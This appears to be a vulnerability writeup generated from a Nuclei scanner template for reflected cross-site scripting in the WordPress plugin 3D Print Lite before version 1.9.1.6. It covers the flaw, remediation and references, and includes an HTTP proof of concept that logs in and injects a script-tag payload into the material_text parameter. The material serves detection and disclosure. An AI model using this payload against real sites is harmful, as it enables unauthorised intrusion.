# Nuclei Template: 3D Print Lite < 1.9.1.6 - Reflected Cross-Site Scripting
**Template ID:** 3d-print-lite-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`3d-print-lite-xss.yaml`)

## Vulnerability Information & PoC

## Description
The plugin does not sanitise and escape some user input before outputting it back in attributes, leading to Reflected Cross-Site Scripting issues

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=p3dlite_materials&material_text="><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Update to plugin version 1.9.1.6 or latest

## References
- https://wpscan.com/vulnerability/5909e225-5756-472e-a2fc-3ac52c7fb909
- https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-3dprint-lite-cross-site-scripting-1-9-1-5/
